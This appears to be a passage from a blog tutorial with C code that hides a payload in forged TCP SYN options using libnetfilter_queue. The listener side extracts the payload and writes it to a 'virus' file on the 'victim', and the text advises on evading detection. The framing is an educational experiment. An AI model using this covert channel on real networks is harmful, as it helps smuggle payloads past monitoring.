+<h4 id="tcp-pkt-struct-h"><a href="#tcp-pkt-struct-h" class="headerlink" title="tcp_pkt_struct.h"></a><code>tcp_pkt_struct.h</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(push, 1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> <span class="title">ipv4_header</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> <span class="title">tcp_header</span>;</span></span><br><span class="line">&#125; <span class="keyword">full_tcp_pkt_t</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(pop)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>This is what we will use to modify packet headers. NFqueue just gives us a void array of bytes, it’s up to us to figure out what to do with. Notice <code>struct iphdr</code> and <code>struct tcphdr</code> are directly from the Linux networking library.</p>
+<h4 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a><code>main.c</code></h4><p>We will treat three functions as a black box (we know what they do but not how they do it). Mostly because I found them on Google and actually have no idea how they work.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ipcsum</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tcpsum</span><span class="params">(struct iphdr *pIph, <span class="keyword">unsigned</span> <span class="keyword">short</span> *ipPayload)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rev</span><span class="params">( <span class="keyword">void</span> *start, <span class="keyword">int</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>ipcsum</code> and <code>tcpsum</code> calculate the checksum of an IPV4 and TCP packet. <code>rev</code> reverses the bytes starting at the passed in pointer for <code>size</code> number of bytes. so <code>01 02 03</code> will become <code>03 02 01</code>. We will use this to fight the battle against different endians for network byte order and Linux byte order.</p>
+<p>Now let’s look at the non-blackbox functions.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cb</span><span class="params">(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, ...)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modify_handshk_pkt</span><span class="params">(<span class="keyword">full_tcp_pkt_t</span> *pkt, <span class="keyword">int</span> pkt_len)</span></span>;</span><br></pre></td></tr></table></figure>
+
+<p>The main functions loads packets from the <code>sk_buff</code> and writes them into a statically allocated 4098 byte buffer. 4098 is overkill for SYN packets. Change it if you want. You don’t have to for experimental purposes.</p>
+<p>The <code>cb</code> is the callback that handles each packet as it enters <code>sk_buff</code> and <code>modify_handshk_pkt</code> will modify or read the packet as needed.</p>
+<hr>
+<h2 id="Plan-of-attack"><a href="#Plan-of-attack" class="headerlink" title="Plan of attack"></a>Plan of attack</h2><p>Let’s take a look at a SYN packet in Wireshark to see what we are working with. I ran a simple web server on port 8000 on the <code>listener</code> </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server &amp;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h5 id="Curl-the-server-from-the-controller"><a href="#Curl-the-server-from-the-controller" class="headerlink" title="Curl the server from the controller"></a>Curl the server from the controller</h5><p><img src="https://lh3.googleusercontent.com/8x-q-9zQtnkNlRhlKgRUCDw5dFFEV7p4vs04eijkdvRriYzkS15rSiZJhLBJr06o5hzMvmW3j2s6onbKEzZWbOC8wYWOwv71g1Wivppxs7vR2FT2ofgmUXXccZUs9f8nSxnzhNkpza-9DKVeRESjA3XRpnGnnikQZqKgtce2qufJ5ss179z5hz3S9kQA1Ke_oi3-n4EDM-GpGUo6T9BG7nepmMOgQ6nr64eftob0cN-8gx6LHZz3pgl7LFpfw77lywh4YE-c0J_yBxevnQC-MZvXckrVqR0x-_53uUS4Rukj1Dh214ZR3iBb_Auy5lyfcg_IbLVKdWtx3qAGvNTeO-yXchhU4yn8GUL25uB2qyYU9DVF57EqD1aYbXhEY5gal6ZOqE9yMoIM9zXi_S4a5P8k5yrhe2mOrHUy_RJ8DmNQgb6UM6Dz435tGeBdZzMErv7H1RvSCQge-n-g2c1yUQmzB8838n4dZ6rr6IL4UcjKawkr7jP1mrrttYabtXg7QlPPAXtc5RscFD3XUoFLukC8qUyIvVAtiFK7R2A-G3MYPxWparIbGAFb0Makzzo6decbt4YsVog1RQh6QmmZ9SqsCZrNm72VX_ydm5xtVywEG-aUbThslSca5HWh69zk-0UeMjCG83KYSup5VQwyGbZGUWUUX8OnTAbzZJVI1uIy3ngJyvdANw=w726-h399-no"></p>
+<h5 id="Let’s-look-at-what-wireshark-shows-filtered-for-just-SYN-packets"><a href="#Let’s-look-at-what-wireshark-shows-filtered-for-just-SYN-packets" class="headerlink" title="Let’s look at what wireshark shows (filtered for just SYN packets)"></a>Let’s look at what wireshark shows (filtered for just SYN packets)</h5><p><img src="https://lh3.googleusercontent.com/2d8aa20a44kd_ubjF1VpyB_0mv6JS9FXm0jfCe-5qUZSOaKpTXIpYkV_aDA-gaYvy3kuYVWFcGvi_5RuYLzmLKPQ11oC7wDhEQci7FVg_6HBPBZs852NenUzQEN0leWZ6ah2VclWziZqOHPios-jbpcZhqpP-0euy7msVHLdjDENsXR-sAKGnr0kXOtuir85MSxXeBdlEs73waRC69wOuKsHae5M71NyfEskJEYPWdyc9F0XpTluel4cl87tRjwngxBZq41tUUZWozWksx4_bdoBZJXfNhXImiPFlxBIQa_mbQZ1UEVOpLfLN7JP_gPO3bZbRhy_wRdcmQ_KnZccq26JQ59EFlFAe5Q90T_6vBvIR6rI5Yc5h5LtkBCnt99-fKw1VQlDRmum14Xdlv23kBtklAzoidmbM4naImy9vt9W2soKwz7NdPuSNUa9Pp21CDqQTL0AER5gylSoOmULrVGNrcOmG8cHkkgsNbrGYAVHBfoGHcQZf1acwIQMeioE6m63JUBhgBAWcIx6GWOIrg6qN7M7E9jLOIabBtQ-TitWyzxsObn6yeev_d-a3tVU-IRp6b_9l3_D0EXiiSxN--_qgcJj5fJdCi-DbxleEy5-WrgFrt8W8WlkaG3wfa7WRYB2zXiobVJ_FwDxHdkfEUpcSsh16UmiM-P-t9QeOAswT4EFrSSTdxHPpYVuasNjvXtYKKbvDH2_OlaBBmQM6uWMntQx4FnAAz6eLvXIBu2om6g=w399-h287-no"></p>
+<hr>
+<h4 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h4><br/>
+The portion that is highlighted in white, `02 04 05 b4` is where the TCP options start. TCP options are placed one after another in the format "Option-Kind: 1 byte - Option-Length: 1 byte - Option-value: value of length - 2 bytes". The option length defines the length for ALL bytes in the option, including the byte used for the kind and length itself. In this case, `02` represents the Maximum Segment Size, has a length of `04`, and a value of `05b4`.
+
+<p>Notice <code>Header Length: 40 bytes</code> further up in Wireshark’s description of the packet. This is a converted form of the <code>Data Offset</code> field.</p>
+<p>So in order to add options at the end, we will need to update the Total Length in the IPV4 packet (look back if you don’t remember) and the <code>Data Offset</code> with as many 4 bit words as are in our options. This also means that the total length of everything we add to the packet has to be a multiple of 4 (you can’t have a fractional <code>Data Offset</code>). We can pad the packet with <code>01</code> or No-OP for this purpose. </p>
+<hr>
+<h2 id="The-Storm-of-Code-Controller"><a href="#The-Storm-of-Code-Controller" class="headerlink" title="The Storm of Code - Controller"></a>The Storm of Code - <code>Controller</code></h2><p>The legit way to add extra data to the TCP packet would be to use an experimental option. However, we want to hide, so let’s use an option that will be very common, like User Timeout (0x1c or 28). IANA has a list of option assignments on their page. </p>
+<p>So let’s add to the code. </p>
+<hr>
+<h4 id="tcp-pkt-struct-h-1"><a href="#tcp-pkt-struct-h-1" class="headerlink" title="tcp_pkt_struct.h"></a><code>tcp_pkt_struct.h</code></h4><p>Insert code at the top</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> METADATA_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(push, 1)</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> padding;</span><br><span class="line">    <span class="keyword">uint8_t</span> opt;</span><br><span class="line">    <span class="keyword">uint8_t</span> len;</span><br><span class="line">    <span class="keyword">uint32_t</span> payload;</span><br><span class="line">    <span class="keyword">uint32_t</span> payload_2;</span><br><span class="line">    <span class="keyword">uint32_t</span> payload_3;</span><br><span class="line"></span><br><span class="line">&#125; pkt_meta;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> pack(pop)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>The option has a kind, a length, and a payload which is a string we will write to a file on the victim. The padding at the beginning is to keep the total length divisible by 4. Because the data will directly be appended to the packet, we cannot use an array and need to split the payload into chunks of 4 bytes.</p>
+<hr>
+<h4 id="main-c-1"><a href="#main-c-1" class="headerlink" title="main.c"></a><code>main.c</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modify_handshk_pkt</span><span class="params">(<span class="keyword">full_tcp_pkt_t</span> *pkt, <span class="keyword">int</span> pkt_len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Should match only SYN packets */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPacket intercepted: \n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pkt-&gt;tcp_header.syn == <span class="number">1</span> &amp;&amp; pkt-&gt;tcp_header.ack == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tPacket type: SYN\n&quot;</span>);</span><br><span class="line">        pkt_meta *metadata = (pkt_meta *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)pkt + pkt_len);</span><br><span class="line">    	metadata-&gt;padding = <span class="number">0x0101</span>;</span><br><span class="line">    	metadata-&gt;opt = <span class="number">0x1c</span>; <span class="comment">// Custom option kind. 28 = User Timeout</span></span><br><span class="line">    	metadata-&gt;len = METADATA_SIZE - <span class="keyword">sizeof</span>(metadata-&gt;padding); <span class="comment">// Custom option length. Default length of User timeout is different.</span></span><br><span class="line">        pkt-&gt;tcp_header.doff += METADATA_SIZE / <span class="number">4</span>; <span class="comment">// Change data offset</span></span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We added in all the code relevant to the TCP packet. At the end, we change the data offset to reflect the additional options. Let’s move onto the callback where the packet is finally sent on its way. </p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cb</span><span class="params">(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, <span class="keyword">void</span> *data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">u_int32_t</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfqnl_msg_packet_hdr</span> *<span class="title">ph</span>;</span></span><br><span class="line">    ph = nfq_get_msg_packet_hdr(nfa);</span><br><span class="line">    id = ntohl(ph-&gt;packet_id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;entering callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">full_tcp_pkt_t</span> *ipv4_payload = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> pkt_len = nfq_get_payload(nfa, (<span class="keyword">unsigned</span> <span class="keyword">char</span> **) &amp;ipv4_payload);</span><br><span class="line">    modify_handshk_pkt(ipv4_payload, pkt_len);</span><br><span class="line"></span><br><span class="line">    rev(&amp;ipv4_payload-&gt;ipv4_header.tot_len, <span class="number">2</span>);</span><br><span class="line">    ipv4_payload-&gt;ipv4_header.tot_len += METADATA_SIZE;</span><br><span class="line">    rev(&amp;ipv4_payload-&gt;ipv4_header.tot_len, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ipv4_payload-&gt;ipv4_header.check = <span class="number">0</span>;</span><br><span class="line">    ipv4_payload-&gt;ipv4_header.check =</span><br><span class="line">        ipcsum((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;ipv4_payload-&gt;ipv4_header,</span><br><span class="line">                <span class="number">20</span>);</span><br><span class="line">    rev(&amp;ipv4_payload-&gt;ipv4_header.check, <span class="number">2</span>); <span class="comment">// Convert between endians</span></span><br><span class="line"></span><br><span class="line">    tcpcsum(&amp;ipv4_payload-&gt;ipv4_header,</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">short</span> *)&amp;ipv4_payload-&gt;tcp_header);</span><br><span class="line">    <span class="keyword">int</span> ret = nfq_set_verdict(qh, id, NF_ACCEPT, (<span class="keyword">u_int32_t</span>) pkt_len + METADATA_SIZE,</span><br><span class="line">            (<span class="keyword">void</span> *) ipv4_payload);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Set verdict status: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We extend the total length of the IPv4 packet so the TCP packet doesn’t get truncated on its way to the destination. The Linux system I was using got confused between it’s preferred Little Endian and the network packet’s Big Endian, so I had to reverse the bytes first, add the length, and reverse the bytes again. This may not be the case for you guys. You can confirm it by seeing if the total length increases by <code>0x0010</code> bytes or by <code>0x1000</code> bytes. We then recalculate the IP and TCP checksum while reversing the bits as necessary. (Normally packets don’t need a valid TCP checksum but let’s put it there anyways).</p>
+<hr>
+<h3 id="Fruit-of-labour"><a href="#Fruit-of-labour" class="headerlink" title="Fruit of labour"></a>Fruit of labour</h3><hr>
+<p>Let’s see the result of our work. Make a build folder and build the entire project using CMake. Then upload to the <code>controller</code>. There’s an IPtables rule in <code>iptables_rules.sh</code> that intercepts SYN packets on port 8000 and sends them to queue 0. If nothing is listening on queue 0 then it simply sends the SYN on its way. </p>
+<p>Steps</p>
+<ol>
+<li>Create build folder and build project</li>
+<li>Upload build folder and <code>iptables_rules.sh</code> file to <code>controller</code>. </li>
+<li>Run <code>iptables_rules.sh</code> as root on <code>controller</code> (only if the system was restarted or this is the first upload)</li>
+<li>Run <code>main</code> in the build folder as root on <code>controller</code></li>
+<li>Start up Wireshark on <code>listener</code> filtering on packets on port 8000 to view the result (to make sure it was received)</li>
+<li>Send HTTP request from <code>controller</code> to <code>listener</code> on port 8000</li>
+</ol>
+<h4 id="Controller-Screenshot"><a href="#Controller-Screenshot" class="headerlink" title="Controller Screenshot"></a><code>Controller Screenshot</code></h4><p><img src="https://lh3.googleusercontent.com/ozlxRmfURS-_pg3KliUPv3ClXyekX3yQsMeQhjPtwSIcaRnbzP6aB-TUbYW8jVoLd44-LLnPu2N8i5uA6JhMy6NGwInnhI2L7Kbz-HJh_aTLOyhQipkyL1DwKr04KopIwDrHGvqPQvwfdFekYhZ5LhIXumYev7PQUitfKIB9YztAbo3xadGPBUWl_THmXjNNlGslkcLYIcMPzBtAMoY1SLSiFB2fWrD3NfKgI5ATrUBgY83dNnRH0kPgwUE8yPIUxcb3fcqNPKZtuOvDc7x77LWWTcILpakBoVwRW-_96MI-OVn5byGkwOGSh2u21wgYB0_KiDKh8y0FsMXZSTqHdo_wSYtP2lNUfXPHDKHrtoA8MfP4jFeSKw8i6QgwYAWFhY34nUMeaYyue0_AtFfDU2pOdh7a6NbjtxTyMndy7Pkx1dimZaeUUTzRVndndSikNiemgzxD-aUfUGJ-cZ5IcWZyUyYDkrVL9ycy0PZw9O2vFTP5N4t4N35GslQhFP7pLvOrhEmz9oM4tb8NEIekfRvO1hHd4jqMRl6i_U_zQp4zEsTbTM5rtvp3qY60ove80xQmPRWj2WcUVPc-22YoRDjOgBx2QM5uf5UxX4h3v702TqxEgNP42QSU5B_alKn7T4WjSIvxfIDXTMCYDIyrCGpoZSwy-Jj_WvaUy4w1Om5-ULFhpXl91KBoD6uOhPfFRHmReTo6-4-d21PR5wNEeWtScVi5w5w0BI2EPb-lkVxE_xE=w1184-h568-no"></p>
+<h4 id="Controller-Wireshark"><a href="#Controller-Wireshark" class="headerlink" title="Controller Wireshark"></a><code>Controller Wireshark</code></h4><p><img src="https://lh3.googleusercontent.com/C9INH6puYSdZBvs9NCInsBbsCR54BqG7gBYBVYZOolno7LSSe8nQGu-Gjdj_-hi9LZi8ddiaBmhG2efRTI_D4NOtHOpaCuFy2_vVOjHgcnukSURS8PmQgWj4wn-QZLqe7O93785LThI0J107jgYwLxln728YFA7OpcbWCZXj378ElFYKWUWDt1zB_EhitebTYILgYpLNH2UNSidNgzErehGddpyCTgnRtRYbRmjJZfWErTWNRT7yaGaXEU0Ct96Dr-EmFg1qB9iUREiQ2At_3PyUcWHXsE7b_JwgXsC-7OCn6TPR1VZrjPLlqDlTYJgkP6B8AOciUtZhEyhCc25BG-XTAJW-Bf_FxG5z0Up1oy8n_903mJnq3w6lS-S37qHEN99JWyeC0Z4JQk9xieaJV-Wcphlmtm-MPBH9EfqbRVh_J6oQ6sdTnNYnNSv8SiA3wWUmjZEM9IPxxNa0lAnCHsam584tEfTIWwfqJJXCtToW7u-BYVwA1icybvdxI-m8yw3kAzYaxkR4d48wojqw7Xt4-z3IKMQUy0RgnfDFQ6-wPecdH_WujZYW13nGuhjGAH0OIJjmX-ILIgBz7XWOH7gPurwn7rkIAIjujua7sh3OKUrS7GsLMwy8l0EDCRyVLLF66OhO6SrbBa7LjWvw0aQoy8sfldgIs5LWnq7znUlX9X-ldgGmETNT81C_TUZ1awrmjkNorrbIinczc8g6zweYPn-o9RKDCOHEe8JyCPdS6hY=w808-h301-no"></p>
+<p>Awesome! The SYN packet in that whole HTTP request has our data added to the end. No kernel programming necessary. Notice that the User timeout is supposed to be 4 bytes and we set it to 14. If you want to be extra stealthy you can use multiple options and break your payload into their individual default lengths so there isn’t an anomaly. For this experiment, we don’t care. :P</p>
+<h2 id="The-Storm-of-Code-listener"><a href="#The-Storm-of-Code-listener" class="headerlink" title="The Storm of Code- listener"></a>The Storm of Code- <code>listener</code></h2><p>Cool we modified a packet from the <code>controller</code>. Big whoop. But now we have to do something with that payload.</p>
+<p>The code in the listener is the exact same for the boilerplate and <code>tcp_pkt_struct.h</code> so refer back if you forgot about them. Let’s go right into <code>main.c</code>.</p>
+<h3 id="main-c-2"><a href="#main-c-2" class="headerlink" title="main.c"></a><code>main.c</code></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write_to_file</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> *payload, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> output_fd;</span><br><span class="line">    <span class="keyword">ssize_t</span> ret_out;</span><br><span class="line"></span><br><span class="line">    output_fd = open(<span class="string">&quot;virusfile.pup&quot;</span>, O_WRONLY | O_CREAT, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span>(output_fd == <span class="number">-1</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open virus file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ret_out = write(output_fd, payload, len);</span><br><span class="line">    close(output_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modify_handshk_pkt</span><span class="params">(<span class="keyword">full_tcp_pkt_t</span> *pkt, <span class="keyword">int</span> pkt_len)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Should match only SYN packets */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nPacket intercepted: \n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (pkt-&gt;tcp_header.syn == <span class="number">1</span> &amp;&amp; pkt-&gt;tcp_header.ack == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\tPacket type: SYN\n&quot;</span>);</span><br><span class="line">        pkt_meta *metadata = (pkt_meta *)((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)pkt + pkt_len - METADATA_SIZE);</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> *payload = (<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(&amp;metadata-&gt;payload);</span><br><span class="line">        write_to_file(payload, METADATA_SIZE - (<span class="keyword">sizeof</span>(metadata-&gt;padding) + <span class="keyword">sizeof</span>(metadata-&gt;opt) + <span class="keyword">sizeof</span>(metadata-&gt;len)));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;RECEIVED PAYLOAD: %s&quot;</span>, payload);</span><br><span class="line">        pkt-&gt;tcp_header.doff -= METADATA_SIZE / <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>We basically do the opposite of what we did in the <code>controller</code> when reading the packet. The pointer for the metadata has to be after the original size of the packet, and instead of writing to the metadata we read from it. Then, we write the payload to a file and reduce the <code>Data Offset</code> back to the initial value. </p>
+<hr>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">cb</span><span class="params">(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, struct nfq_data *nfa, <span class="keyword">void</span> *data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">u_int32_t</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nfqnl_msg_packet_hdr</span> *<span class="title">ph</span>;</span></span><br><span class="line">    ph = nfq_get_msg_packet_hdr(nfa);</span><br><span class="line">    id = ntohl(ph-&gt;packet_id);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;entering callback\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">full_tcp_pkt_t</span> *ipv4_payload = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> pkt_len = nfq_get_payload(nfa, (<span class="keyword">unsigned</span> <span class="keyword">char</span> **) &amp;ipv4_payload);</span><br><span class="line">    modify_handshk_pkt(ipv4_payload, pkt_len);</span><br><span class="line">        rev(&amp;ipv4_payload-&gt;ipv4_header.tot_len, <span class="number">2</span>);</span><br><span class="line">    ipv4_payload-&gt;ipv4_header.tot_len -= METADATA_SIZE;</span><br><span class="line">    rev(&amp;ipv4_payload-&gt;ipv4_header.tot_len, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">	ipv4_payload-&gt;ipv4_header.check = <span class="number">0</span>;</span><br><span class="line">    ipv4_payload-&gt;ipv4_header.check =</span><br><span class="line">        ipcsum((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)&amp;ipv4_payload-&gt;ipv4_header,</span><br><span class="line">                <span class="number">20</span>);</span><br><span class="line">    rev(&amp;ipv4_payload-&gt;ipv4_header.check, <span class="number">2</span>); <span class="comment">// Convert between endians</span></span><br><span class="line"></span><br><span class="line">    tcpcsum(&amp;ipv4_payload-&gt;ipv4_header,</span><br><span class="line">          (<span class="keyword">unsigned</span> <span class="keyword">short</span> *)&amp;ipv4_payload-&gt;tcp_header);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> ret = nfq_set_verdict(qh, id, NF_ACCEPT, (<span class="keyword">u_int32_t</span>) pkt_len - METADATA_SIZE,</span><br><span class="line">            (<span class="keyword">void</span> *) ipv4_payload);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n Set verdict status: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>Again, just reversing what we did earlier by reducing total length, recalculating checksum, and truncating packet bytes sent out by <code>libnetfilter_queue</code> library. </p>
+<hr>
+<h3 id="Proving-it-worked"><a href="#Proving-it-worked" class="headerlink" title="Proving it worked"></a>Proving it worked</h3><p>Let’s look at some screenshots to see that it worked.</p>
+<p>Steps to build:</p>
+<ol>
+<li>Build the project like shown in <code>controller</code></li>
+<li>Note that <code>iptables_rules.sh</code> captures on PREROUTING and not POSTROUTING to intercept packets coming into the system. Upload and run iptables scripts as shown in <code>controller</code>.</li>
+<li>Use <code>iptables_clean.sh</code> if you mess up (note that it flushes a ton of rules because I’m lazy) or remove the rule manually and try again. </li>
+<li>Run the <code>server</code> executable in build directory on the <code>listener</code></li>
+</ol>
+<hr>
